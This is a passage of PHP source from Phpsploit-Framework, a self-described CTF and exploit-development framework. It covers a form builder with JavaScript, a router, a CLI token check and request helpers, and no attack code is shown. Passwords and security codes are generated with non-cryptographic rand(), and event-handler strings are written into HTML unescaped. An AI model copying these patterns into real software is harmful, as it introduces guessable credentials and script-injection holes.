                    $_event_processing .= chr ( 32 ) . ( $event ) . chr ( 61 ) . chr ( 34 ) . ( $processing ) . chr ( 34 ) . chr ( 59 ) . chr ( 32 );
                }
            }
            $_form .= '<input id="' . Class_Base_Format ::htmlentities ( $item[ "id" ] ) . '" name="' . Class_Base_Format ::htmlentities ( $item[ "name" ] ) . '" type="hidden" value="' . Class_Base_Format ::htmlentities ( $item[ "value" ] ) . '" ' . $_event_processing . '>';
        }
        $_form .= '<div>';
        foreach ( $selects as $select_index => $item ) {
            if ( ( ! isset( $item[ "id" ] ) ) || ( ! is_string ( $item[ "id" ] ) ) ) {
                $item[ "id" ] = ( "selects_" . $select_index );
            }
            if ( ( ! isset( $item[ "name" ] ) ) || ( ! is_string ( $item[ "name" ] ) ) ) {
                $item[ "name" ] = ( "selects_" . $select_index );
            }
            if ( ( ! isset( $item[ "explanatory_note" ] ) ) || ( ( ! is_string ( $item[ "explanatory_note" ] ) ) && ( ! is_numeric ( $item[ "explanatory_note" ] ) ) ) ) {
                $item[ "explanatory_note" ] = "";
            }
            if ( ( ! isset( $item[ "disabled" ] ) ) || ( ! is_string ( $item[ "disabled" ] ) ) ) {
                $item[ "disabled" ] = "";
            }
            if ( ( ! isset( $item[ "style" ] ) ) || ( ! is_string ( $item[ "style" ] ) ) ) {
                $item[ "style" ] = "";
            }
            if ( ( ! isset( $item[ "options" ] ) ) || ( ! is_array ( $item[ "options" ] ) ) ) {
                $item[ "options" ] = array ();
            }
            $_event_processing = '';
            foreach ( $item[ "events" ] as $event => $processing ) {
                if ( ( is_string ( $event ) ) & ( strlen ( $event ) > 0 ) && ( is_string ( $event ) ) && ( strlen ( $processing ) > 0 ) ) {
                    $_event_processing .= chr ( 32 ) . ( $event ) . chr ( 61 ) . chr ( 34 ) . ( $processing ) . chr ( 34 ) . chr ( 59 ) . chr ( 32 );
                }
            }
            $_form .= '<div style="margin-top: 32px;">';
            $_form .= '<table style="width:100%;font-size:18px;"><tr><td width="20%" style="text-align: left;">' . Class_Base_Format ::htmlentities ( $item[ "title" ] ) . '</td><td width="60%" style="text-align: center;"><select name="' . Class_Base_Format ::htmlentities ( $item[ "name" ] ) . '" size="1" style="width:100%;height:32px;line-height:24px;font-size:18px;border-width:2px;text-align:center;' . Class_Base_Format ::htmlentities ( $item[ "style" ] ) . '"  ' . $item[ "disabled" ] . ' ' . $_event_processing . '><option value=""> ------ SELECT ------ </option>';
            foreach ( $item[ "options" ] as $option_index => $option ) {
                if ( isset( $option[ "value" ] ) ) {
                    if ( ( ! isset( $option[ "title" ] ) ) || ( ( ! is_string ( $option[ "title" ] ) ) && ( is_numeric ( $option[ "title" ] ) ) ) ) {
                        $option[ "title" ] = $option[ "value" ];
                    }
                    if ( ( ! isset( $option[ "describe" ] ) ) || ( ( ! is_string ( $option[ "describe" ] ) ) && ( is_numeric ( $option[ "describe" ] ) ) ) ) {
                        $option[ "describe" ] = $option[ "title" ];
                    }
                    if ( ( ! isset( $option[ "selected" ] ) ) || ( ( ! is_string ( $option[ "selected" ] ) ) ) ) {
                        $option[ "selected" ] = "";
                    }
                    $_form .= '<option title="' . Class_Base_Format ::htmlentities ( $option[ "describe" ] ) . '" value="' . Class_Base_Format ::htmlentities ( $option[ "value" ] ) . '" ' . $option[ "selected" ] . '>' . Class_Base_Format ::htmlentities ( $option[ "title" ] ) . '</option>';
                }
            }
            $_form .= '</select></td><td width="20%" style="padding-left:10px;text-align:left;color:red;">' . Class_Base_Format ::htmlentities ( $item[ "explanatory_note" ] ) . '</td></tr></table>';
            $_form .= '</div>';
        }
        $_form .= '</div>';
        $_form .= '<div>';
        foreach ( $inputs as $input_index => $item ) {
            if ( ( ! isset( $item[ "id" ] ) ) || ( ! is_string ( $item[ "id" ] ) ) ) {
                $item[ "id" ] = ( "inputs_" . $input_index );
            }
            if ( ( ! isset( $item[ "name" ] ) ) || ( ! is_string ( $item[ "name" ] ) ) ) {
                $item[ "name" ] = ( "inputs_" . $input_index );
            }
            if ( ( ! isset( $item[ "value" ] ) ) || ( ( ! is_string ( $item[ "value" ] ) ) && ( ! is_numeric ( $item[ "value" ] ) ) ) ) {
                $item[ "value" ] = "";
            }
            if ( ( ! isset( $item[ "title" ] ) ) || ( ( ! is_string ( $item[ "title" ] ) ) && ( ! is_numeric ( $item[ "title" ] ) ) ) ) {
                $item[ "title" ] = $item[ "value" ];
            }
            if ( ( ! isset( $item[ "describe" ] ) ) || ( ( ! is_string ( $item[ "describe" ] ) ) && ( ! is_numeric ( $item[ "describe" ] ) ) ) ) {
                $item[ "describe" ] = $item[ "value" ];
            }
            if ( ( ! isset( $item[ "explanatory_note" ] ) ) || ( ( ! is_string ( $item[ "explanatory_note" ] ) ) && ( ! is_numeric ( $item[ "explanatory_note" ] ) ) ) ) {
                $item[ "explanatory_note" ] = "";
            }
            if ( ( ! isset( $item[ "disabled" ] ) ) || ( ! is_string ( $item[ "disabled" ] ) ) ) {
                $item[ "disabled" ] = "";
            }
            if ( ( ! isset( $item[ "style" ] ) ) || ( ! is_string ( $item[ "style" ] ) ) ) {
                $item[ "style" ] = "";
            }
            $_event_processing = '';
            foreach ( $item[ "events" ] as $event => $processing ) {
                if ( ( is_string ( $event ) ) & ( strlen ( $event ) > 0 ) && ( is_string ( $event ) ) && ( strlen ( $processing ) > 0 ) ) {
                    $_event_processing .= chr ( 32 ) . ( $event ) . chr ( 61 ) . chr ( 34 ) . ( $processing ) . chr ( 34 ) . chr ( 59 ) . chr ( 32 );
                }
            }
            $_form .= '<div style="height:32px;"></div>';
            $_form .= '<div>';
            $_form .= '<table style="width:100%;line-height:24px;font-size:18px;"><tr><td width="20%" style="text-align: left;">' . Class_Base_Format ::htmlentities ( $item[ "title" ] ) . '</td><td width="60%">';
            $_form .= '<input name="' . Class_Base_Format ::htmlentities ( $item[ "name" ] ) . '" type="text" title="' . Class_Base_Format ::htmlentities ( $item[ "describe" ] ) . '" style="width:100%;line-height:24px;font-size:18px;border-width:2px;text-align:center;' . Class_Base_Format ::htmlentities ( $item[ "style" ] ) . '"  value="' . Class_Base_Format ::htmlentities ( $item[ "value" ] ) . '" ' . Class_Base_Format ::htmlentities ( $item[ "disabled" ] ) . ' ' . $_event_processing . '>';
            $_form .= '</td><td width="20%" style="padding-left:10px;text-align:left;color:red;">' . Class_Base_Format ::htmlentities ( $item[ "explanatory_note" ] ) . '</td></tr></table>';
            $_form .= '</div>';
        }
        $_form .= '</div>';
        $_form .= '<div>';
        foreach ( $textareas as $textarea_index => $item ) {
            if ( ( ! isset( $item[ "id" ] ) ) || ( ! is_string ( $item[ "id" ] ) ) ) {
                $item[ "id" ] = ( "textareas_" . $textarea_index );
            }
            if ( ( ! isset( $item[ "name" ] ) ) || ( ! is_string ( $item[ "name" ] ) ) ) {
                $item[ "name" ] = ( "textareas_" . $textarea_index );
            }
            if ( ( ! isset( $item[ "value" ] ) ) || ( ( ! is_string ( $item[ "value" ] ) ) && ( ! is_numeric ( $item[ "value" ] ) ) ) ) {
                $item[ "value" ] = "";
            }
            if ( ( ! isset( $item[ "title" ] ) ) || ( ( ! is_string ( $item[ "title" ] ) ) && ( ! is_numeric ( $item[ "title" ] ) ) ) ) {
                $item[ "title" ] = $item[ "value" ];
            }
            if ( ( ! isset( $item[ "describe" ] ) ) || ( ( ! is_string ( $item[ "describe" ] ) ) && ( ! is_numeric ( $item[ "describe" ] ) ) ) ) {
                $item[ "describe" ] = $item[ "value" ];
            }
            if ( ( ! isset( $item[ "explanatory_note" ] ) ) || ( ( ! is_string ( $item[ "explanatory_note" ] ) ) && ( ! is_numeric ( $item[ "explanatory_note" ] ) ) ) ) {
                $item[ "explanatory_note" ] = "";
            }
            if ( ( ! isset( $item[ "disabled" ] ) ) || ( ! is_string ( $item[ "disabled" ] ) ) ) {
                $item[ "disabled" ] = "";
            }
            if ( ( ! isset( $item[ "style" ] ) ) || ( ! is_string ( $item[ "style" ] ) ) ) {
                $item[ "style" ] = "";
            }
            $_event_processing = '';
            foreach ( $item[ "events" ] as $event => $processing ) {
                if ( ( is_string ( $event ) ) & ( strlen ( $event ) > 0 ) && ( is_string ( $event ) ) && ( strlen ( $processing ) > 0 ) ) {
                    $_event_processing .= chr ( 32 ) . ( $event ) . chr ( 61 ) . chr ( 34 ) . ( $processing ) . chr ( 34 ) . chr ( 59 ) . chr ( 32 );
                }
            }
            $_form .= '<div style="height:32px;"></div>';
            $_form .= '<div>';
            $_form .= '<table style="width:100%;line-height:24px;font-size:18px;">';
            $_form .= '<tr>';
            $_form .= '<td width="20%" style="text-align: left;">';
            $_form .= Class_Base_Format ::htmlentities ( $item[ "title" ] );
            $_form .= '</td>';
            $_form .= '<td width="60%" style="text-align: left;">';
            $_form .= '<textarea name="' . Class_Base_Format ::htmlentities ( $item[ "name" ] ) . '" style="width:100%;height:200px;font-size:18px;' . Class_Base_Format ::htmlentities ( $item[ "style" ] ) . '" ' . Class_Base_Format ::htmlentities ( $item[ "disabled" ] ) . ' ' . $_event_processing . '>' . Class_Base_Format ::htmlentities ( $item[ "value" ] ) . '</textarea>';
            $_form .= '</td>';
            $_form .= '<td width="20%" style="padding-left:10px;text-align: left;color:red;">';
            $_form .= Class_Base_Format ::htmlentities ( $item[ "explanatory_note" ] );
            $_form .= '</td>';
            $_form .= '</tr>';
            $_form .= '</table>';
            $_form .= '</div>';
        }
        $_form .= '</div>';
        $_form .= '<div>';
        foreach ( $files as $file_index => $item ) {
            if ( ( ! isset( $item[ "id" ] ) ) || ( ! is_string ( $item[ "id" ] ) ) ) {
                $item[ "id" ] = ( "files_" . $file_index );
            }
            if ( ( ! isset( $item[ "name" ] ) ) || ( ! is_string ( $item[ "name" ] ) ) ) {
                $item[ "name" ] = ( "files_" . $file_index );
            }
            if ( ( ! isset( $item[ "value" ] ) ) || ( ( ! is_string ( $item[ "value" ] ) ) && ( ! is_numeric ( $item[ "value" ] ) ) ) ) {
                $item[ "value" ] = "";
            }
            if ( ( ! isset( $item[ "title" ] ) ) || ( ( ! is_string ( $item[ "title" ] ) ) && ( ! is_numeric ( $item[ "title" ] ) ) ) ) {
                $item[ "title" ] = $item[ "value" ];
            }
            if ( ( ! isset( $item[ "describe" ] ) ) || ( ( ! is_string ( $item[ "describe" ] ) ) && ( ! is_numeric ( $item[ "describe" ] ) ) ) ) {
                $item[ "describe" ] = $item[ "value" ];
            }
            if ( ( ! isset( $item[ "explanatory_note" ] ) ) || ( ( ! is_string ( $item[ "explanatory_note" ] ) ) && ( ! is_numeric ( $item[ "explanatory_note" ] ) ) ) ) {
                $item[ "explanatory_note" ] = "";
            }
            if ( ( ! isset( $item[ "disabled" ] ) ) || ( ! is_string ( $item[ "disabled" ] ) ) ) {
                $item[ "disabled" ] = "";
            }
            if ( ( ! isset( $item[ "style" ] ) ) || ( ! is_string ( $item[ "style" ] ) ) ) {
                $item[ "style" ] = "";
            }
            $_event_processing = '';
            foreach ( $item[ "events" ] as $event => $processing ) {
                if ( ( is_string ( $event ) ) & ( strlen ( $event ) > 0 ) && ( is_string ( $event ) ) && ( strlen ( $processing ) > 0 ) ) {
                    $_event_processing .= chr ( 32 ) . ( $event ) . chr ( 61 ) . chr ( 34 ) . ( $processing ) . chr ( 34 ) . chr ( 59 ) . chr ( 32 );
                }
            }
            $_form .= '<div style="height:32px;"></div>';
            $_form .= '<div>';
            $_form .= '<table style="width:100%;line-height:24px;font-size:18px;"><tr><td width="20%" style="text-align: left;">' . Class_Base_Format ::htmlentities ( $item[ "title" ] ) . '</td><td width="60%" style="text-align: left;">';
            $_form .= '<input name="' . Class_Base_Format ::htmlentities ( $item[ "name" ] ) . '" type="file" title="' . Class_Base_Format ::htmlentities ( $item[ "describe" ] ) . '" style="width:100%;line-height:24px;font-size:18px;border-width:2px;text-align:left;' . Class_Base_Format ::htmlentities ( $item[ "style" ] ) . '"  value="' . Class_Base_Format ::htmlentities ( $item[ "value" ] ) . '" ' . Class_Base_Format ::htmlentities ( $item[ "disabled" ] ) . ' ' . $_event_processing . '>';
            $_form .= '</td><td width="20%" style="padding-left:10px;text-align:left;color:red;">' . Class_Base_Format ::htmlentities ( $item[ "explanatory_note" ] ) . '</td></tr></table>';
            $_form .= '</div>';
        }
        $_form .= "</div>";
        $_form .= '<div style="height:32px;"></div>';
        $_form .= '</div>';
        $_form .= '<script type="text/javascript">';
        $_form .= 'var source_form_element_names=new Array(),source_form_element_names_index=0;';
        $_form .= 'function exist_form_elements(form_elements,name)';
        $_form .= '{';
        $_form .= '   for(index=0;index<form_elements.length;index++)';
        $_form .= '   {';
        $_form .= '       if(form_elements[index]==undefined){ console.log("form_elements["+index+"] is undefined , in exist_form_elements");  }';
        $_form .= '       if(form_elements[index].name==name)';
        $_form .= '       {';
        $_form .= '           console.log("form elements [ "+name+" ] is exist");';
        $_form .= '           return true;';
        $_form .= '       }';
        $_form .= '   }';
        $_form .= '   console.log("form elements [ "+name+" ] not is exist");';
        $_form .= '   return false;';
        $_form .= '}';
        $_form .= 'function get_form_source_element_names_index(form_elements,name)';
        $_form .= '{';
        $_form .= '   for(index=0;index<form_elements.length;index++)';
        $_form .= '   {';
        $_form .= '       if(form_elements[index]==undefined){ console.log("form_elements["+index+"] is undefined , in get_form_source_element_names_index");  }';
        $_form .= '       if(form_elements[index]["name"]==name)';
        $_form .= '       {';
        $_form .= '           console.log(name+" index is "+index);';
        $_form .= '           return index;';
        $_form .= '       }';
        $_form .= '   }';
        $_form .= '   console.log(name+" index is not found");';
        $_form .= '   console.log(form_elements);';
        $_form .= '   return false;';
        $_form .= '}';
        $_form .= 'function click_dyn_add_button(form_id,input_hidden_field_id)';
        $_form .= '{';
        $_form .= '    console.clear();';
        $_form .= '    var index = parseInt(document.getElementById(input_hidden_field_id).value);';
        $_form .= '    if(index>=9){alert("Considering the limitation of interface space, the current number of dynamic forms is limited to 10."); return ; }';
        $_form .= '    if(document.getElementById("div_id_dyn_form_show_"+form_id).innerHTML==""){';
        $_form .= '       document.getElementById("div_id_dyn_form_show_"+form_id).innerHTML = document.getElementById("div_dyn_form_id_"+form_id).innerHTML;';
        $_form .= '       for(i=0;i<document.getElementById(form_id).elements.length;i++)';
        $_form .= '       {';
        $_form .= '           if(!document.getElementById(form_id).elements[i].id){ source_form_element_names[source_form_element_names_index]=new Array(); source_form_element_names[source_form_element_names_index]["name"]=document.getElementById(form_id).elements[i].name;  console.log(source_form_element_names[source_form_element_names_index]);   source_form_element_names_index++; }';
        $_form .= '       }';
        $_form .= '       source_form_element_names_index=0;';
        $_form .= '       console.log(source_form_element_names); ';
        $_form .= '    }else{';
        $_form .= '       document.getElementById("div_id_dyn_form_show_"+form_id).innerHTML += document.getElementById("div_dyn_form_id_"+form_id).innerHTML;';
        $_form .= '    }';
        $_form .= '    console.log(document.getElementById(form_id).elements);';
        $_form .= '    for(i=0;i<document.getElementById(form_id).elements.length;i++)';
        $_form .= '    {';
        $_form .= '        var name_items = document.getElementById(form_id).elements[i].name.split("_");';
        $_form .= '        if(name_items.length>=1)';
        $_form .= '        {';
        $_form .= '            console.log(name_items);';
        $_form .= '            var name_last_item = name_items[name_items.length-1];';
        $_form .= '            console.log("name_last_item : "+name_last_item);';
        $_form .= '            var name_last_item_is_not_a_integer = (!is_integer(name_last_item));';
        $_form .= '            console.log("name_last_item_is_not_a_integer : "+name_last_item_is_not_a_integer);';
        $_form .= '            var element_name_neq_dyn_form_hidden_index_name = (document.getElementById(form_id).elements[i].name!="dyn_form_hidden_index_name");';
        $_form .= '            console.log("element_name_neq_dyn_form_hidden_index_name : "+element_name_neq_dyn_form_hidden_index_name);';
        $_form .= '            var element_name_neq_submit_name = (document.getElementById(form_id).elements[i].name!="' . Class_Base_Format ::htmlentities ( $submit[ "name" ] ) . '");';
        $_form .= '            console.log("element_name_neq_submit_name : "+element_name_neq_submit_name);';
        $_form .= '            var element_name_neq_reset_name = (document.getElementById(form_id).elements[i].name!="' . Class_Base_Format ::htmlentities ( $reset[ "name" ] ) . '");';
        $_form .= '            console.log("element_name_neq_reset_name : "+element_name_neq_reset_name);';
        $_form .= '            var element_name_neq_button_name = (document.getElementById(form_id).elements[i].name!="' . Class_Base_Format ::htmlentities ( $button[ "name" ] ) . '");';
        $_form .= '            console.log("element_name_neq_button_name : "+element_name_neq_button_name);';
        $_form .= '            elment_name_in_source_form_element_index = get_form_source_element_names_index(source_form_element_names,document.getElementById(form_id).elements[i].name);';
        $_form .= '            console.log("elment_name_in_source_form_element_index : "+elment_name_in_source_form_element_index);';
        $_form .= '            source_form_element_is_not_undefined = (elment_name_in_source_form_element_index!==false);';
        $_form .= '            console.log("source_form_element_is_not_undefined : "+source_form_element_is_not_undefined);';
        $_form .= '            var element_name_is_not_exist = ((source_form_element_is_not_undefined)&&(!exist_form_elements((document.getElementById(form_id).elements),(source_form_element_names[elment_name_in_source_form_element_index]["name"]+"_"+index))));';
        $_form .= '            console.log("element_name_is_not_exist : "+element_name_is_not_exist);';
        $_form .= '            var element_id_is_not_exist = (!document.getElementById(form_id).elements[i].id);';
        $_form .= '            console.log("element_id_is_not_exist : "+element_id_is_not_exist);';
        $_form .= '            if((name_last_item_is_not_a_integer)&&(element_name_neq_dyn_form_hidden_index_name)&&(element_name_neq_submit_name)&&(element_name_neq_reset_name)&&(element_name_neq_button_name)&&(source_form_element_is_not_undefined )&&(element_name_is_not_exist)&&(element_id_is_not_exist)){ ';
        $_form .= '                document.getElementById(form_id).elements[i].name=(source_form_element_names[elment_name_in_source_form_element_index]["name"]+"_"+index); console.log("new element name : "+document.getElementById(form_id).elements[i].name); ';
        $_form .= '            }';
        $_form .= '        }';
        $_form .= '    }';
        $_form .= '    console.log(source_form_element_names);';
        $_form .= '    document.getElementById(input_hidden_field_id).value=(index+1); ';
        $_form .= '    document.getElementById("div_id_dyn_form_show_"+form_id).style.display="block";';
        $_form .= '}';
        $_form .= '</script>';

        return $_form;
    }

    public static function json ( $object = null )
    {
        if ( ( ! is_array ( $object ) ) && ( ! is_object ( $object ) ) ) {
            if ( is_integer ( $object ) ) {
                $object = array ( 'integer' => $object );
            } else if ( is_float ( $object ) ) {
                $object = array ( 'float' => $object );
            } else if ( is_double ( $object ) ) {
                $object = array ( 'double' => $object );
            } else if ( is_bool ( $object ) ) {
                $object = array ( 'boolean' => $object );
            } else if ( is_string ( $object ) ) {
                $object = array ( 'string' => $object );
            }
        }
        $_json = json_encode ( $object , JSON_PRETTY_PRINT );
        return $_json;
    }
}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 22-12-10
 * Time: 下午3:53
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

class Class_Main extends Class_Root implements Interface_Main
{

    public static function route_execute ()
    {
        if ( is_cli () ) {
            global $_SERVER;
            if ( ! is_array ( $_SERVER ) ) {
                $_SERVER = array ();
            }
        }
        if ( ( ! isset( $_SERVER ) ) || ( ! is_array ( $_SERVER ) ) ) {
            $_SERVER = array ();
        }
        if ( empty( $_SERVER[ "REQUEST_URI" ] ) ) {
            $_SERVER[ "REQUEST_URI" ] = "/";
        }
        if ( ( ! isset( $_REQUEST ) ) || ( ! is_array ( $_REQUEST ) ) ) {
            $_REQUEST = array ();
        }
        if ( ( $_SERVER[ "REQUEST_URI" ] == "/test" ) && ( empty( DEVLOP ) ) ) {
            throw new \Exception( "In a production environment, the test controller (/test) cannot be used, and/test should only be used for development and testing environments as appropriate." , 0 );
        }
        if ( ( $_SERVER[ "REQUEST_URI" ] != "/" ) && ( $_SERVER[ "REQUEST_URI" ] != "/test" ) && ( $_SERVER[ "REQUEST_URI" ] != "/clear" ) && ( $_SERVER[ "REQUEST_URI" ] != "/login" ) && ( $_SERVER[ "REQUEST_URI" ] != "/init_user_info" ) && ( is_cli () ) ) {
            self::cli_authorization_check ();
        }
        foreach ( $GLOBALS[ "ROUTE_MAPS" ] as $key => $value ) {
            if ( strtolower ( $key ) == strtolower ( str_replace ( "\\" , "/" , $_SERVER[ "REQUEST_URI" ] ) ) ) {
                $GLOBALS[ "ROUTE_ACTION" ] = $value;
                break;
            }
        }
        if ( empty( $GLOBALS[ "ROUTE_ACTION" ] ) ) {
            if ( defined ( "DEVELOP" ) ) {
                throw new \Exception ( "route " . $_SERVER[ "REQUEST_URI" ] . " is not exist" , 0 );
            } else {
                throw new \Exception ( "route " . $_SERVER[ "REQUEST_URI" ] . " is not exist" , 0 );
            }
        }
        if ( strpos ( $GLOBALS[ "ROUTE_ACTION" ] , "::" ) === false ) {
            throw new \Exception( "Route resolution failed" , 0 );
        }
        $_class_info       = explode ( "::" , $GLOBALS[ "ROUTE_ACTION" ] );
        $_class_info_count = count ( $_class_info );
        if ( ( $_class_info_count <= 1 ) || ( $_class_info_count > 2 ) ) {
            throw new \Exception( "Class information acquisition failed" , 0 );
        }
        $_class_name        = $_class_info[ 0 ];
        $_class_method_name = $_class_info[ 1 ];
        if ( ! class_exists ( $_class_name ) ) {
            throw new \Exception( "class ( '.$_class_name.' ) is not exist" , 0 );
        }
        if ( ! method_exists ( $_class_name , $_class_method_name ) ) {
            throw new \Exception( "class ( " . $_class_name . " ) :: function ( " . $_class_method_name . " ) is not exist." , 0 );
        }
        $_execute_result = call_user_func ( $GLOBALS[ "ROUTE_ACTION" ] , $_REQUEST );
        return $_execute_result;
    }

    public static function config_read ( $filename )
    {
        if ( ! file_exists ( $filename ) ) {
            throw new Exception( "config file " . $filename . " is not found" , 0 );
        }
        $_array = @json_decode ( @file_get_contents ( $filename ) , true );
        if ( ! is_array ( $_array ) ) {
            throw new Exception( "config file " . $filename . " is format error" , 0 );
        }
        return $_array;
    }

    public static function cli_authorization_check ()
    {
        if ( is_cli () ) {
            global $_SERVER;
            global $_REQUEST;
            if ( ! Class_Operate_User::exist_token () ) {
                Class_Base_Response::outputln ( "The command line authentication token has not been initialized, and the program has been disabled from running! Please log in to the management backend through web and access /cli/create_token The  module completes the initialization operation of the command line authentication token." );
                exit( 0 );
            }
            if ( ( ! is_array ( $_REQUEST ) ) || ( empty( $_REQUEST[ "md5_token" ] ) ) ) {
                Class_Base_Response::outputln ( "please enter the correct cli authentication token value!" );
                exit( 0 );
            }
            if ( ! Class_Operate_User::check_md5_token ( $_REQUEST[ "md5_token" ] ) ) {
                Class_Base_Response::outputln ( "cli authentication token input error!" );
                exit( 0 );
            }
            if ( ( ( empty( $_SERVER[ "REQUEST_URI" ] ) ) || ( $_SERVER[ "REQUEST_URI" ] != "/" ) ) && ( empty( $_REQUEST[ "is_enable_license_agreement" ] ) ) ) {
                Class_Base_Response::outputln ( "Sorry, due to your refusal to accept the relevant terms and conditions in the user agreement and disclaimer of this software, you are no longer able to use this software! If you forcibly continue to use this software, it will be considered as an infringement on the author of this software. The author of this software reserves the right to pursue legal responsibility from you!" );
                exit( 0 );
            }
            Class_Base_Auth::enable_login ();
        }
    }
}



/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-4-29
 * Time: 上午9:19
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

class Class_Base_Error extends Class_Base implements Interface_Base_Error
{
    const ERROR                                 = 10000000;
    const SYSTEM_ERROR                          = 10001000;
    const SYSTEM_EXCEPTION                      = 10002000;
    const EXCEPTION                             = 20000000;
    const FILE_EXCEPTION                        = 20001000;
    const FILE_EXCEPTION_DELETE                 = 20001001;
    const MEMORY_EXCEPTION                      = 20002000;
    const NETWORK_EXCEPTION                     = 20003000;
    const NETWORK_EXCEPTION_CLIENT_DISCONNECTED = 20003001;

}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-2-23
 * Time: 上午11:18
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

class Class_Base_Exception extends \Exception implements Interface_Base_Exception
{

}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-6-8
 * Time: 上午8:15
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

class Class_Base_Extension extends Class_Base
{
    const EXTENSION_NAME_SHMOP = "shmop";
    const EXTENSION_NAME_CURL  = "curl";

    private static $_enabled_extensions = false;

    public static function exist_enabled_extensions ( $extension_name )
    {
        if ( ( ! is_string ( $extension_name ) ) || ( strlen ( $extension_name ) <= 0 ) ) {
            throw new \Exception( ( "extension_name is error , extension_name : " . print_r ( $extension_name , true ) ) , 0 );
        }
        $_exist = @extension_loaded ( $extension_name );
        if ( is_null ( $_exist ) ) {
            $_exist = false;
        }
        return $_exist;
    }

    public static function get_enabled_extensions ()
    {
        if ( ( ! isset( self::$_enabled_extensions ) ) || ( ! is_array ( self::$_enabled_extensions ) ) ) {
            self::$_enabled_extensions = @get_loaded_extensions ();
            if ( is_null ( self::$_enabled_extensions ) ) {
                self::$_enabled_extensions = false;
            }
        }
        if ( ( is_null ( self::$_enabled_extensions ) ) || ( self::$_enabled_extensions === false ) || ( ! is_array ( self::$_enabled_extensions ) ) ) {
            throw new \Exception( "get enabled extensions is error" , 0 );
        }
        return self::$_enabled_extensions;
    }

    public static function get_extension_functions ( $extension_name )
    {
        if ( ! self::exist_enabled_extensions ( $extension_name ) ) {
            return false;
        }
        $_functions = @get_extension_funcs ( $extension_name );
        if ( ( ! is_null ( $_functions ) ) && ( is_array ( $_functions ) ) ) {
            return $_functions;
        }
        return false;
    }


}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 22-12-13
 * Time: 下午12:24
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

class Class_Base_Request extends Class_Base implements Interface_Base_Request
{
    const TYPE_DATA_TEXT = 10000001;
    const TYPE_DATA_BIN  = 10000002;
    const TYPE_UNKNOWN   = 0;
    const TYPE_STRING    = 1001;
    const TYPE_INTEGER   = 1002;
    const VALUE_UNKNOWN  = null;
    const VALUE_STRING   = "";
    const VALUE_INTEGER  = 0;

    private static $_params = null;

    public static function init ( $timeout = 60 )
    {
        set_time_limit ( $timeout );
    }

    public static function init_form ()
    {
        if ( is_null ( self ::$_params ) || ( ! is_array ( self ::$_params ) ) ) {
            self ::$_params = $_REQUEST;
        }
    }

    public static function create_password ()
    {
        $_password = "";
        for ( $i = 0 ; $i < 18 ; $i ++ ) {
            $_password .= chr ( rand ( 33 , 126 ) );
        }
        return $_password;
    }

    public static function create_security_code ()
    {
        $_password = "";
        for ( $i = 0 ; $i < 18 ; $i ++ ) {
            $_password .= chr ( rand ( 33 , 126 ) );
        }
        return $_password;
    }

    public static function form ( $name , $type = self::TYPE_UNKNOWN , $value = self::VALUE_UNKNOWN )
    {
        self ::init_form ();
        if ( ! isset( self ::$_params[ $name ] ) ) {
            $_value = null;
            if ( $type == self::TYPE_INTEGER ) {
                $_value = intval ( $value );
            }
            if ( $type == self::TYPE_STRING ) {
                $_value = strval ( $value );
            }
            return $_value;
        }
        $_value = self ::$_params[ $name ];
        if ( $type == self::TYPE_INTEGER ) {
            $_value = intval ( self ::$_params[ $name ] );
        }
        if ( $type == self::TYPE_STRING ) {
            $_value = strval ( self ::$_params[ $name ] );
        }
        return $_value;
    }

